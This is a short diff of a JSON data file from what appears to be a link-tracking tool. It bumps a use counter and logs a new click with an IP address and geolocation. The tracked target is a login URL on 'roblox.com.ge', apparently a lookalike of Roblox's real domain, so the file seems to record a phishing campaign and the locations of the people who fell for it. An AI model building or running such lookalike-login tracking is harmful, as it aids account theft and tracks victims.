@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1272,
+    "useCount": 1273,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10320,6 +10320,14 @@
         "city": "Nuku'alofa",
         "flag": "🇹🇴",
         "countryCode": "TO"
+      },
+      {
+        "timestamp": 1777363912117,
+        "ip": "209.212.217.217",
+        "country": "Maldives",
+        "city": "Malé",
+        "flag": "🇲🇻",
+        "countryCode": "MV"
       }
     ]
   },
